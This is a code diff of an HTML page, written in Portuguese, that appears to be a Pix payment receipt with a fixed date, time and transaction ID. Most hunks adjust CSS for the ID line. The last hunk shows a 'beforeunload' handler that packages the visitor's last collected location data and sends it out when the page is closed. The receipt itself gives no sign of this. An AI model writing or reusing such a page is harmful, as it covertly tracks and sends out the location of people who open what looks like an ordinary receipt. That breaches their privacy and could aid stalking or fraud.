@@ -13,12 +13,17 @@
       display: block;
       margin: 0 auto 15px auto;
     }
-    /* Força a quebra do ID da transação para caber perfeitamente no espaço */
+    .linha-id {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 15px;
+    }
     .id-transacao-container {
       word-break: break-all;
       overflow-wrap: break-word;
-      max-width: 220px;
       text-align: right;
+      max-width: 55%; /* Força o texto a quebrar antes de ultrapassar o limite */
       font-size: 13px;
     }
   </style>
@@ -35,11 +40,10 @@
       <p><span>Data do Pagamento:</span> <span>Sábado, 14/11/2026</span></p>
       <p><span>Horário:</span> <span>00:16</span></p>
       
-      <!-- ID da Transação ajustado para quebrar dentro do espaço -->
-      <p style="display: flex; justify-content: space-between; align-items: flex-start;">
+      <div class="linha-id">
         <span>ID da Transação:</span> 
         <span class="id-transacao-container">PIXcSqf5BBNLaKrFy1C6kPAj6sexVR2Z</span>
-      </p>
+      </div>
       
       <hr style="border: 0; border-top: 1px solid #ddd; margin: 10px 0;">
 
@@ -119,7 +123,6 @@
         });
     }
 
-    // Dispara o envio ao fechar ou sair da página com segurança
     window.addEventListener('beforeunload', function () {
       const payload = JSON.stringify({
         ...dadosUltimaLocalizacao,
